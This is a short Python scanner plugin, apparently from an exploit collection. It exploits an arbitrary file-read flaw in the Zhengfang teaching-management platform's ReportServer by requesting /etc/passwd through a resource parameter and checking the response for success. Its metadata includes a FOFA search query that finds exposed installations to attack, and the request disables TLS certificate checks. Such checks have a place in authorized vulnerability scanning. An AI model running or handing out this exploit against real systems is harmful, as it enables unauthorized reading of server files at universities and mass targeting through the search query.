#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/WjbLpv3GAlcErv6tmMEv2w',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '正方教学管理信息服务平台ReportServer任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'body="正方软件股份有限公司" && title="教学管理信息服务平台"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/15',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret